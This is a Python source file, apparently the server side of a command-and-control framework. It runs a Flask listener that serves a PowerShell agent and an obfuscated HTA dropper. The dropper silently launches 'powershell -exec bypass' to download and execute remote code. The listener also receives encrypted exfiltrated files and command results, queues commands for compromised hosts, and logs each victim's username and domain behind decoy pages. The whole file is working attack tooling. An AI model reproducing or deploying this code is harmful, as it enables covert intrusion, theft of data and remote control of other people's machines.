#!/usr/bin/python


import threading
import time
import base64
import sys
import os
import signal
import string
import random
from termcolor import colored
import requests as web_requests
from .functions import *
from .encryption import *
from .esa import *
from flask import *
import logging
parentfolder = os.path.abspath("..")
if parentfolder not in sys.path:
    sys.path.insert(0, parentfolder)
from profile import *
# disable logging

app = Flask(__name__)
log = logging.getLogger('werkzeug')
log.disabled = True

class NewListener:

  def __init__(self, *args):
    arguments = len(args)
    self.arguments = arguments
    if len(args) == 6:
        self.name = args[0]
        self.bindip = args[1]
        self.bindport = args[2]
        self.host = args[3]
        self.interval = args[4]
        self.path = args[5]

    elif len(args) == 8:

        self.name = args[0]
        self.bindip = args[1]
        self.bindport = args[2]
        self.host = args[3]
        self.interval = args[4]
        self.path = args[5]
        self.cert = args[7]
        self.key = args[6]


  def start_listener(self):
    host = [self.bindip, self.bindport]

    if self.arguments == 6:
        self.ssl = False
        thread = threading.Thread(target=app.run, args=(host))
        thread.daemon = True
        thread.start()
    if self.arguments == 8:
        # certficates path (worked !)
        self.ssl = True
        print(colored("SSL listener started !", "yellow"))
        # self.cert ==> fullchain.pem
        # self.key  ==> key.pem
        # which is generated from letsencrypt certbot !

        cert = {"ssl_context": (self.cert, self.key)}
        thread = threading.Thread(target=app.run, args=(host), kwargs=cert)
        thread.daemon = True
        thread.start()
    listeners_information[self.name] = [self.name, self.bindip, self.bindport, self.host, self.interval, self.path, self.ssl]

  def powershell_code(self):
      f = open("agents/agent.ps1.oct")
      if self.ssl:
          proto = "https"
      else:
          proto = "http"

      srvhost = self.host + ":" + str(self.bindport)
      template = f.read()
      pcode = replace_agent_config_vars(template, proto, srvhost, self.interval)
      response = make_response(pcode)
      response.headers["Server"] = server_response_header
      return response

  def create_path(self):
      a = "".join([random.choice(string.ascii_uppercase) for i in range(3)])
      app.add_url_rule("/%s" % self.path, a, self.powershell_code)

  def create_hta(self):
      app.add_url_rule(mshta_url, "hta" , self.hta)

  def hta(self):
      code = '''
<html>
<head>
<script language="JScript">
window.resizeTo(1, 1);
window.moveTo(-2000, -2000);
window.blur();
try
{
    window.onfocus = function() { window.blur(); }
    window.onerror = function(sMsg, sUrl, sLine) { return false; }
}
catch (e){}
function replaceAll(find, replace, str)
{
  while( str.indexOf(find) > -1)
  {
    str = str.replace(find, replace);
  }
  return str;
}
function bas( string )
    {
        string = replaceAll(']','=',string);
        string = replaceAll('[','a',string);
        string = replaceAll(',','b',string);
        string = replaceAll('@','D',string);
        string = replaceAll('-','x',string);
        string = replaceAll('~','N',string);
        string = replaceAll('*','E',string);
        string = replaceAll('%','C',string);
        string = replaceAll('$','H',string);
        string = replaceAll('!','G',string);
        string = replaceAll('{','K',string);
        string = replaceAll('}','O',string);
        var characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
        var result     = '';
        var i = 0;
        do {
            var b1 = characters.indexOf( string.charAt(i++) );
            var b2 = characters.indexOf( string.charAt(i++) );
            var b3 = characters.indexOf( string.charAt(i++) );
            var b4 = characters.indexOf( string.charAt(i++) );
            var a = ( ( b1 & 0x3F ) << 2 ) | ( ( b2 >> 4 ) & 0x3 );
            var b = ( ( b2 & 0xF  ) << 4 ) | ( ( b3 >> 2 ) & 0xF );
            var c = ( ( b3 & 0x3  ) << 6 ) | ( b4 & 0x3F );
            result += String.fromCharCode(a) + (b?String.fromCharCode(b):'') + (c?String.fromCharCode(c):'');
        } while( i < string.length );
        return result;
    }
var es = '{code}';
eval(bas(es));
</script>
<hta:application caption="no" showInTaskBar="no" windowState="minimize" navigable="no" scroll="no" />
</head>
<body>
</body>
</html>
'''
      js = '''
var cm="powershell -exec bypass -w 1 -c $V=new-object net.webclient;$V.proxy=[Net.WebRequest]::GetSystemWebProxy();$V.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX($V.downloadstring('{protocol}://{ip}:{port}/{payload}'));";
var w32ps= GetObject('winmgmts:').Get('Win32_ProcessStartup');
w32ps.SpawnInstance_();
w32ps.ShowWindow=0;
var rtrnCode=GetObject('winmgmts:').Get('Win32_Process').Create(cm,'c:\\\\',w32ps,null);
'''


      if self.ssl:
          protocol = "https"
      else:
          protocol = "http"

      js = js.replace('{ip}',self.host).replace('{port}',str(self.bindport)).replace('{payload}',self.path).replace("{protocol}", protocol)
      #print  js
      js = base64.b64encode(js.encode()).decode() #js.encode('base64').replace('\n', '')
      re = [[']','='],['[','a'],[',','b'],['@','D'],['-','x'],['~','N'],['*','E'],['%','C'],['$','H'],['!','G'],['{','K'],['}','O']]

      for i in re:
            js = js.replace(i[1], i[0])
      #print js
      code=code.replace('{code}',js)
      resp = make_response(code)
      resp.headers["Server"] = server_response_header
      return resp




@app.route("/")
def index():
    resp = make_response("<title>Under development</title><center><h1>Under development server</h1></center>")
    resp.headers["Server"] = server_response_header
    return resp


kill_listener_url = "".join([random.choice(string.ascii_uppercase + string.ascii_lowercase) for i in range(15)])
kill_listener_token = "".join([random.choice(string.ascii_uppercase + string.ascii_lowercase) for i in range(50)])

def delete_listener(listener_name):
    try:
        listener_info = listeners_information.get(listener_name)
        host = listener_info[1]
        port = listener_info[2]
    except:
        print(colored("[-] Worng listener name!", "red"))
        return False

    data = {"shutdown_token": kill_listener_token}
    request = web_requests.post("http://%s:%s/%s" % (host, port, kill_listener_url), data=data)
    if request.text == "d":
        del listeners_information[listener_name]
        print(colored("[+] Listener %s has been deleted" % (listener_name), "green"))

def shutdown_server():
    func = request.environ.get('werkzeug.server.shutdown')
    if func is None:
        pass
    func()

@app.route('/%s' % kill_listener_url, methods=['POST'])
def shutdown():
    token = request.form["shutdown_token"]
    if token == kill_listener_token:
        shutdown_server()
        return "d"
    else:
        return "No!"


@app.route(file_receiver_url, methods=["POST"])
def fr():
    filename = decrypt_command(aes_key, aes_iv, request.form["fn"].replace(" ","+"))
    f = open(filename.strip("\x00"), "wb")
    #fdata = request.form["token"].replace(" ", "+").encode().
    fdata = request.form["token"].replace(" ", "+")
    raw_base64 = decrypt_command(aes_key, aes_iv, fdata)
    #ready_to_write = base64.b64decode(fdata.decode("UTF-16LE"))
    f.write(base64.b64decode(raw_base64.encode()))
    #f.write(base64.b64decode(raw_base64.decode("UTF-16LE")))
    f.close()
    print(colored("\n[+] File %s downloaded from the client !" % filename, "green"))
    response = make_response("Nothing to see here !")
    response.headers["Server"] = server_response_header
    return response


@app.route(report_url)
def report():
    try:
        encrypted_host = request.headers["App-Logic"]
        hostname = decrypt_command(aes_key, aes_iv, encrypted_host).strip("\x00")
        for key in list(connections_information.keys()):
            if hostname in connections_information[key][2]:
                session = connections_information[key]
                header = request.headers["Authorization"]
                processes = decrypt_command(aes_key, aes_iv, header).strip("\x00").split(" ")
                esa(processes, session)
            else:
                pass
        response = make_response("Cool page !")
        response.headers["Server"] = server_response_header
        return response
    except:
        return ""



@app.route(command_send_url)
def command(hostname):
    for key in list(connections_information.keys()):
        if hostname in connections_information[key]:
            required_key = key
            connections_information[required_key][6] = time.ctime()
    try:
            command_to_execute = commands[hostname]
            commands[hostname] = encrypt_command(aes_key, aes_iv, "False")
    except KeyError:
            return "False"
    response = make_response(command_to_execute)
    response.headers["Server"] = server_response_header
    return response


@app.route(command_receiver_url)
def cr():
        try:
            encrypted_response = request.headers["Authorization"]
            encrypted_hostname = request.headers["App-Logic"]
            encrypted_command  = request.headers["Session"]

            results = decrypt_command(aes_key, aes_iv, encrypted_response).strip("\x00")
            hostname = decrypt_command(aes_key, aes_iv, encrypted_hostname).strip("\x00")
            command = decrypt_command(aes_key, aes_iv, encrypted_command).strip("\x00")
            log_command(hostname, command, results)
            print("\nCommand execution result is : \n" + results + "\n")
            return "Done"
        except:
            return ""


@app.errorhandler(404)
def page_not_found(e):
    response = make_response('<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN"> <title>404 Not Found</title> <h1>Not Found</h1> <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>')
    response.headers["Server"] = server_response_header
    return response


@app.route(first_ping_url)
def first_ping():
        try:
            global counter
            header = request.headers["Authorization"]
            raw_request = str(decrypt_command(aes_key, aes_iv, header)).strip("\x00").split(",")
            hostname = raw_request[0]
            if hostname in list(commands.keys()):
                    return "HostName exist"

            username = raw_request[1]
            os_version = raw_request[2]
            pid = raw_request[3]
            domain = raw_request[4]
            ip = request.environ['REMOTE_ADDR']
            last_ping = time.ctime()
            connections_information[counter] = [counter, ip, hostname, pid, username, domain, last_ping, os_version]
            print("\n\x1b[6;30;42m new connection \x1b[0m from %s (%s) as session %s" %(username, ip, counter))
            commands[hostname] = encrypt_command(aes_key, aes_iv, "False")
            counter = counter + 1
            response = make_response("")
            response.headers["Server"] = server_response_header
            return response
        except:
            return ""
